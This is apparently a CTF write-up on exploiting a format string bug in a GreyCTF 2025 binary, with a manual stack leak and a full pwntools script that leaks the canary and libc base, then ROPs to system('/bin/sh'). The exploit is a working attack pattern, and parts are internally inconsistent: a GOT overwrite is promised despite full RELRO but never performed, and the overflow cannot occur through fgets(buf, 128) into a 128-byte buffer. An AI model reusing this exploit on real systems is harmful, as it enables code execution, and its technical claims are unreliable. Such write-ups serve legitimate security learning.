---
title: "Format String Vulnerability: Leaking Canaries and Hijacking GOT"
date: "2025-10-03"
category: "Binary Exploitation"
description: "Using a format string bug to leak a stack canary and libc address, then overwriting the GOT to redirect execution."
---

## Overview

This binary from GreyCTF 2025 has all protections enabled: PIE, NX, full RELRO... except it has a format string vulnerability that lets us leak arbitrary stack values. We use it to defeat the canary and PIE, then overwrite a GOT entry to get code execution.

## The Vulnerability

```c
void echo() {
    char buf[128];
    fgets(buf, 128, stdin);
    printf(buf);  // no format string argument — attacker controlled
    fgets(buf, 128, stdin);
    // ... more logic
}
```

Passing `%p` or `%x` format specifiers lets us read values off the stack. With enough `%p.%p.%p...` we can walk the stack to find the canary (typically at a fixed offset from the format string buffer) and a libc return address.

## Leaking the Canary

We use pwntools' `fmtstr_payload` primitives to automate offset discovery, but first let's manually confirm:

```bash
$ echo '%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' | ./vuln
0x7ffd1a2b3c40.0x7f8b4c000700.(nil).0x1.0x7f8b4bfff8c0.
0x6161616161616161.0x1234abcd00000000.0xa.0x7f8b4c0a1d50.
0x555555555200.0x7f8b4c07b080
```

The canary always ends in `\x00` (null byte). Offset 7 shows `0x1234abcd00000000` — that trailing null is the canary's lowest byte. From here we can compute the exact stack canary value and a libc base from the leak at offset 9.

## Exploit

```python
from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf  = ELF("./vuln")
p    = process("./vuln")

# Stage 1: leak canary and libc base
p.sendline(b"%7$p.%9$p")
leaks     = p.recvline().split(b".")
canary    = int(leaks[0], 16)
libc_leak = int(leaks[1], 16)
libc.address = libc_leak - libc.sym["__libc_start_main"] - 0x80

log.success(f"Canary:    {hex(canary)}")
log.success(f"Libc base: {hex(libc.address)}")

# Stage 2: overflow with known canary, ROP to system("/bin/sh")
bin_sh   = next(libc.search(b"/bin/sh"))
system   = libc.sym["system"]
pop_rdi  = libc.address + 0x2a3e5  # found via ROPgadget in libc

payload  = b"A" * 120
payload += p64(canary)
payload += p64(0)              # saved rbp
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

## Takeaways

- Never pass user input as the first argument to `printf` — always use `printf("%s", buf)`.
- Even with all mitigations enabled, an information leak breaks PIE and canary protection.
- Format string bugs are still common in real CTF binaries and occasionally in production code.
